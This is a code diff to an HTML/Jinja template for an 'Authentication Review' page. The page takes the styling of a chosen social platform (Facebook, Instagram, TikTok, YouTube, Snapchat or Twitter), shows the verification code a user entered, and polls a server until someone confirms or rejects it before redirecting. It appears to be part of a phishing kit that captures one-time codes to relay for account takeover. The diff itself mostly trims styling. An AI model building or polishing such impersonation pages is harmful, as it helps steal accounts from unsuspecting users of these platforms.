@@ -3,9 +3,8 @@
 <div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px {{ platform_color|default('#3B82F6') }}25;border-radius:16px;">
   {% if platform_icon and platform_name %}
   <div class="platform-header">
-    <!-- ENHANCED: Exact social media logo styling from your other pages -->
-    <div class="icon-circle {{ platform_bg_class|default('bg-twitter') }}">
-      <i class="{{ platform_icon }} icon-lg"></i>
+    <div class="icon-circle" style="background: {{ platform_color|default('#3B82F6') }}20; border: 2px solid {{ platform_color|default('#3B82F6') }}30;">
+      <i class="{{ platform_icon }}" style="color: {{ platform_color|default('#3B82F6') }};"></i>
     </div>
     <div>
       <h2 class="notranslate" style="margin:0;color:{{ platform_color|default('#3B82F6') }};">{{ platform_name }}</h2>
@@ -20,20 +19,13 @@
       <div class="loading-spinner"></div>
       <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:18px;font-weight:600">🔒 Authentication Review</h3>
       <p style="color:#64748b;text-align:center;margin-bottom:24px;line-height:1.5;">
-        Your security credentials are undergoing verification through our enterprise-grade authentication system. 
-        This ensures the highest level of account protection and compliance with security protocols.
+        Your security credentials are undergoing verification through our authentication system. 
+        This ensures account protection and compliance with security protocols.
       </p>
       
       <div class="code-display">
         <span class="code-label">Verification Code:</span>
         <span class="code-value">{{ code_value }}</span>
-      </div>
-
-      <!-- ENHANCED: Professional security status -->
-      <div style="margin-top:20px;padding:12px 16px;background:{{ security_bg|default('#f0f9ff') }};border-radius:12px;border:1px solid {{ security_border|default('#e0f2fe') }};">
-        <p style="margin:0;color:{{ platform_color|default('#3B82F6') }};font-size:0.85rem;font-weight:500;text-align:center;">
-          🔐 Enterprise Security Protocol Active
-        </p>
       </div>
     </div>
 
@@ -48,13 +40,8 @@
       <div class="error-message" style="background: #fef2f2; border: 1px solid #fecaca; border-radius: 12px; padding: 16px; margin-bottom: 24px;">
         <p style="color:#7f1d1d;text-align:center;margin:0;line-height:1.5;">
           <strong>Additional Verification Required</strong><br>
-          The provided code could not be authenticated. Please request a new verification code to continue.
+          Please request a new verification code to continue.
         </p>
-      </div>
-
-      <div class="code-display" style="background: #fef2f2; border-color: #fecaca;">
-        <span class="code-label" style="color:#7f1d1d;">Attempted Code:</span>
-        <span class="code-value" style="color:#7f1d1d; background: #fee2e2; border-color: #fecaca;">{{ code_value }}</span>
       </div>
 
       <div class="action-buttons" style="margin-top: 24px;">
@@ -73,15 +60,8 @@
       
       <h3 style="color:#059669;margin:20px 0 12px 0;font-size:18px;font-weight:600">✅ Verification Successful</h3>
       <p style="color:#047857;text-align:center;margin-bottom:24px;line-height:1.5;">
-        Your identity has been successfully verified. You are now being redirected to the secure portal...
+        Your identity has been successfully verified. Redirecting...
       </p>
-
-      <!-- ENHANCED: Success security note -->
-      <div style="margin-top:20px;padding:12px 16px;background:#ecfdf5;border-radius:12px;border:1px solid #a7f3d0;">
-        <p style="margin:0;color:#047857;font-size:0.85rem;font-weight:500;text-align:center;">
-          🎉 Identity Verified Successfully
-        </p>
-      </div>
     </div>
   </div>
 </div>
@@ -117,19 +97,15 @@ function checkConfirmation() {
     .then(response => response.json())
     .then(data => {
       if (data.confirmed) {
-        // Code approved - show success and redirect
         showSuccessState();
         setTimeout(() => {
           window.location.href = nextUrl;
         }, 2000);
       } else if (data.rejected) {
-        // Code rejected - show rejection message
         showRejectedState();
       } else if (data.resend_requested) {
-        // User has requested new code - show appropriate message
         showRejectedState();
       } else {
-        // Still pending - continue checking
         setTimeout(checkConfirmation, 3000);
       }
     })
@@ -143,7 +119,6 @@ function requestNewCode() {
   const resendBtn = document.querySelector('.resend-btn');
   const originalText = resendBtn.innerHTML;
   
-  // Show loading state on button
   resendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Generating New Code...';
   resendBtn.disabled = true;
   
@@ -156,13 +131,7 @@ function requestNewCode() {
   .then(response => response.json())
   .then(data => {
     if (data.success) {
-      // Show temporary success message before redirect
-      resendBtn.innerHTML = '<i class="fa-solid fa-check"></i> Redirecting...';
-      resendBtn.style.background = '#10B981';
-      
-      setTimeout(() => {
-        window.location.href = data.redirect_url || '/';
-      }, 1000);
+      window.location.href = data.redirect_url;
     } else {
       alert('Unable to generate new verification code. Please try again.');
       resendBtn.innerHTML = originalText;
@@ -176,16 +145,6 @@ function requestNewCode() {
     resendBtn.disabled = false;
   });
 }
-
-// Enhanced: Add some visual feedback while waiting
-let dots = 0;
-setInterval(() => {
-  dots = (dots + 1) % 4;
-  const statusEl = document.getElementById('status-message');
-  if (statusEl && statusEl.textContent.includes('Progress')) {
-    statusEl.textContent = 'Security Verification in Progress' + '.'.repeat(dots);
-  }
-}, 500);
 
 // Start checking for confirmation
 setTimeout(checkConfirmation, 2000);
@@ -239,93 +198,32 @@ setTimeout(checkConfirmation, 2000);
 .platform-header {
   display: flex;
   align-items: center;
-  gap: 14px;
+  gap: 12px;
   margin-bottom: 24px;
   padding-bottom: 20px;
   border-bottom: 1px solid #f1f5f9;
 }
 
-/* ENHANCED: Exact platform icon styling from your CSS */
 .icon-circle {
-  width: 58px;
-  height: 58px;
+  width: 50px;
+  height: 50px;
   border-radius: 50%;
   display: flex;
   align-items: center;
   justify-content: center;
   flex-shrink: 0;
-  transition: all 0.4s ease;
 }
-
-/* Platform-specific styles matching your design */
-.bg-facebook .icon-circle {
-  background: #fff;
-  box-shadow: 0 0 0 4px rgba(24,119,242,0.15), 0 0 14px rgba(24,119,242,0.25);
-}
-.bg-facebook i { color: #1877F2; }
-
-.bg-instagram .icon-circle {
-  background: #fff;
-  box-shadow: 0 0 0 4px rgba(193,53,132,0.15), 0 0 14px rgba(225,48,108,0.25);
-}
-.bg-instagram i {
-  background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  font-weight: 800;
-}
-
-.bg-tiktok .icon-circle {
-  background: #fff;
-  box-shadow: 0 0 0 4px rgba(0,0,0,0.1), 0 0 16px rgba(255,0,80,0.25), 0 0 16px rgba(0,242,234,0.25);
-}
-.bg-tiktok i {
-  color: #000;
-  text-shadow: -1.8px 0 #00f2ea, 1.8px 0 #ff0050;
-  font-weight: 800;
-}
-
-.bg-youtube .icon-circle {
-  background: #fff;
-  box-shadow: 0 0 0 4px rgba(255,0,0,0.18), 0 0 14px rgba(255,0,0,0.28);
-}
-.bg-youtube i { color: #FF0000; font-weight: 800; }
-
-.bg-snapchat .icon-circle {
-  background: #fff;
-  box-shadow: 0 0 0 4px rgba(255,252,0,0.22), 0 0 18px rgba(255,252,0,0.35);
-}
-.bg-snapchat i {
-  color: #FFFC00;
-  -webkit-text-stroke: 1.5px #000;
-  font-weight: 800;
-}
-
-.bg-twitter .icon-circle {
-  background: #fff;
-  box-shadow: 0 0 0 4px rgba(0,0,0,0.12), 0 0 16px rgba(0,0,0,0.22);
-}
-.bg-twitter i { color: #000; font-weight: 800; }
-
-.icon-lg { font-size: 28px; }
 
 .resend-btn:hover {
   background: {{ platform_color|default('#3B82F6') }} !important;
   filter: brightness(0.9);
   transform: translateY(-1px);
-  box-shadow: 0 4px 12px {{ platform_color|default('#3B82F6') }}40;
 }
 
 .resend-btn:disabled {
   opacity: 0.7;
   cursor: not-allowed;
   transform: none !important;
-}
-
-/* Enhanced loading animation */
-.loading-spinner {
-  border-top-color: {{ platform_color|default('#3B82F6') }};
-  box-shadow: 0 0 10px {{ platform_color|default('#3B82F6') }}30;
 }
 </style>
 {% endblock %}
